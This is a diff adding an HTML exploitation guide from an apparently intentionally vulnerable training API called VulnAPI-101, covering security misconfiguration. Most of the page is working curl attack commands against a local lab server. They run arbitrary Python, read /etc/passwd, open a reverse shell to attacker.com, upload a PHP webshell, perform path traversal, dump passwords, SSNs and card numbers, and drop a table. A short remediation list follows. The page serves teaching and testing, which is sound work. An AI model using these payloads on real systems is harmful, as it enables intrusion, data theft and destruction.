@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API8:2023 - Security Misconfiguration | VulnAPI-101</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <header>
+        <h1>VulnAPI-101 <span class="warning-badge">GUIDES</span></h1>
+        <p>OWASP API Top 10 Vulnerability Reference</p>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/static/index.html">API Testing</a></li>
+            <li><a href="/guides/">Vulnerability Guides</a></li>
+            <li><a href="/guides/by-vulnerability.html">By Vulnerability</a></li>
+            <li><a href="/guides/by-file.html">By File</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <div class="container">
+            <h2><span class="owasp-tag owasp-api8">API8:2023</span> Security Misconfiguration</h2>
+            <span class="badge badge-danger">CRITICAL SEVERITY</span>
+
+            <h3>Description</h3>
+            <p>Security misconfiguration includes debug mode enabled in production, verbose error messages, unnecessary features enabled, missing security hardening, permissive CORS, exposed sensitive files, and default credentials.</p>
+
+            <h3>Affected Files</h3>
+            <ul>
+                <li><code>app/config.py</code> - Hardcoded secrets, debug mode</li>
+                <li><code>app/__init__.py</code> - Verbose errors, permissive CORS</li>
+                <li><code>app/routes/debug.py</code> - Debug endpoints exposed</li>
+                <li><code>app/routes/admin.py</code> - Config exposure, raw SQL</li>
+                <li><code>app/routes/files.py</code> - Dangerous file uploads</li>
+                <li><code>run.py</code> - Debug mode, binding to 0.0.0.0</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Exploitation Guide</h2>
+
+            <h3>1. Debug Mode Enabled</h3>
+            <p>Flask debug mode exposes detailed errors and allows code execution:</p>
+            <div class="code-container">
+                <pre><code># Trigger error to see stack trace
+curl "http://localhost:5000/api/debug/error?type=division"
+
+# Response includes:
+# - Full stack trace
+# - File paths
+# - Python path
+# - Local variables
+
+# Interactive debugger (if Werkzeug debugger enabled)
+# Would allow RCE via debug PIN</code></pre>
+            </div>
+
+            <h3>2. Hardcoded Secrets</h3>
+            <p>Secrets are hardcoded in configuration:</p>
+            <div class="code-container">
+                <pre><code># Get configuration including secrets
+curl http://localhost:5000/api/admin/config \
+  -H "Authorization: Bearer $TOKEN"
+
+# Response includes:
+# SECRET_KEY: 'super-secret-key-12345'
+# JWT_SECRET: 'jwt-secret-weak'
+# ADMIN_USERNAME: 'admin'
+# ADMIN_PASSWORD: 'admin123'
+
+# Debug endpoint also exposes secrets
+curl http://localhost:5000/api/debug/config</code></pre>
+            </div>
+
+            <h3>3. Remote Code Execution</h3>
+            <p>Debug endpoints allow arbitrary code execution:</p>
+            <div class="code-container">
+                <pre><code># Execute arbitrary Python code
+curl -X POST http://localhost:5000/api/debug/execute \
+  -H "Content-Type: application/json" \
+  -d '{"code": "import os; result = os.popen(\"id\").read()"}'
+
+# Evaluate expressions
+curl -X POST http://localhost:5000/api/debug/eval \
+  -H "Content-Type: application/json" \
+  -d '{"expression": "__import__(\"os\").popen(\"whoami\").read()"}'
+
+# Read sensitive files
+curl -X POST http://localhost:5000/api/debug/execute \
+  -H "Content-Type: application/json" \
+  -d '{"code": "result = open(\"/etc/passwd\").read()"}'
+
+# Reverse shell (EDUCATIONAL ONLY)
+curl -X POST http://localhost:5000/api/debug/execute \
+  -H "Content-Type: application/json" \
+  -d '{"code": "import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"}'</code></pre>
+            </div>
+
+            <h3>4. SQL Injection via Admin Endpoint</h3>
+            <div class="code-container">
+                <pre><code># Direct SQL execution
+curl -X POST http://localhost:5000/api/admin/database/query \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"query": "SELECT * FROM users"}'
+
+# Data exfiltration
+curl -X POST http://localhost:5000/api/admin/database/query \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"query": "SELECT username, password, ssn, credit_card FROM users"}'
+
+# Data modification
+curl -X POST http://localhost:5000/api/admin/database/query \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"query": "UPDATE users SET role = '\''admin'\'' WHERE username = '\''john'\''"}'
+
+# Table deletion
+curl -X POST http://localhost:5000/api/admin/database/query \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"query": "DROP TABLE IF EXISTS audit_logs"}'</code></pre>
+            </div>
+
+            <h3>5. Environment Variable Exposure</h3>
+            <div class="code-container">
+                <pre><code># Get all environment variables
+curl http://localhost:5000/api/debug/env
+
+# System info endpoint
+curl http://localhost:5000/api/admin/system/info
+
+# phpinfo-style disclosure
+curl http://localhost:5000/api/debug/phpinfo</code></pre>
+            </div>
+
+            <h3>6. Permissive CORS</h3>
+            <p>CORS allows requests from any origin:</p>
+            <div class="code-container">
+                <pre><code># Check CORS headers
+curl -I -X OPTIONS http://localhost:5000/api/users \
+  -H "Origin: https://evil.com" \
+  -H "Access-Control-Request-Method: GET"
+
+# Response headers:
+# Access-Control-Allow-Origin: *
+# Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
+# Access-Control-Allow-Headers: *
+
+# Any website can now make authenticated requests!</code></pre>
+            </div>
+
+            <h3>7. Dangerous File Uploads</h3>
+            <p>No restriction on uploaded file types:</p>
+            <div class="code-container">
+                <pre><code># Upload PHP webshell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+curl -X POST http://localhost:5000/api/files/upload \
+  -H "Authorization: Bearer $TOKEN" \
+  -F "file=@shell.php"
+
+# Upload executable
+curl -X POST http://localhost:5000/api/files/upload \
+  -H "Authorization: Bearer $TOKEN" \
+  -F "file=@malware.exe"
+
+# Path traversal in filename
+curl -X POST http://localhost:5000/api/files/upload \
+  -H "Authorization: Bearer $TOKEN" \
+  -F "file=@shell.php;filename=../../../var/www/html/shell.php"</code></pre>
+            </div>
+
+            <h3>8. Path Traversal</h3>
+            <div class="code-container">
+                <pre><code># Read /etc/passwd
+curl -X POST http://localhost:5000/api/files/read \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"filename": "../../../etc/passwd"}'
+
+# Read application source
+curl -X POST http://localhost:5000/api/files/read \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"filename": "../app/config.py"}'
+
+# Download traversal
+curl "http://localhost:5000/api/files/download/../../../etc/passwd"</code></pre>
+            </div>
+
+            <h3>9. Verbose Error Messages</h3>
+            <div class="code-container">
+                <pre><code># Trigger various errors
+curl "http://localhost:5000/api/debug/error?type=division"
+curl "http://localhost:5000/api/debug/error?type=attribute"
+curl "http://localhost:5000/api/debug/error?type=index"
+
+# Errors reveal:
+# - Full file paths
+# - Stack traces
+# - Internal variable values
+# - Python version and paths</code></pre>
+            </div>
+        </div>
+
+        <div class="container">
+            <h2>Impact</h2>
+            <ul>
+                <li><strong>Remote Code Execution:</strong> Full server compromise</li>
+                <li><strong>Data Breach:</strong> Access to all secrets and data</li>
+                <li><strong>Server Takeover:</strong> Reverse shells, malware upload</li>
+                <li><strong>Credential Theft:</strong> Database passwords, API keys</li>
+                <li><strong>Cross-Site Attacks:</strong> Permissive CORS enables CSRF</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Remediation</h2>
+            <ol>
+                <li>Disable debug mode in production</li>
+                <li>Use environment variables for secrets</li>
+                <li>Remove debug/test endpoints</li>
+                <li>Implement proper CORS policy</li>
+                <li>Validate and sanitize file uploads</li>
+                <li>Use generic error messages</li>
+                <li>Remove raw SQL query endpoints</li>
+                <li>Regular security audits</li>
+            </ol>
+        </div>
+    </main>
+
+    <footer>
+        <p>VulnAPI-101 - Educational Purposes Only | <a href="https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/">OWASP Reference</a></p>
+    </footer>
+</body>
+</html>
